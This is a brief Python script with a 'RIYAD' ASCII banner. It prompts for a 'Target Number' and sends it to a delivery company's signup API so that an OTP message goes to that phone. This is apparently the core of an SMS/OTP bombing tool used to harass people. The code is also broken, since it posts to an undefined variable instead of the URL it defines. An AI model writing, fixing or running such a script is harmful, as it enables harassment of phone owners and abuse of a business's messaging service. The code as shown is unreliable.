import requests

logo = ("""
 
██████╗░██╗██╗░░░██╗░█████╗░██████╗░
██╔══██╗██║╚██╗░██╔╝██╔══██╗██╔══██╗
██████╔╝██║░╚████╔╝░███████║██║░░██║
██╔══██╗██║░░╚██╔╝░░██╔══██║██║░░██║
██║░░██║██║░░░██║░░░██║░░██║██████╔╝
╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░
""")
print(logo)

number = input("Enter Target Number: ")
url2="https://api.redx.com.bd/v1/user/signup"
data = {"referrerWallet": number}

response = requests.post(url, json=data)

if response.status_code == 200:
    print("OTP request successful!")
    print("Response:", response.json())
else:
    print("Error requesting OTP. Status code:", response.status_code)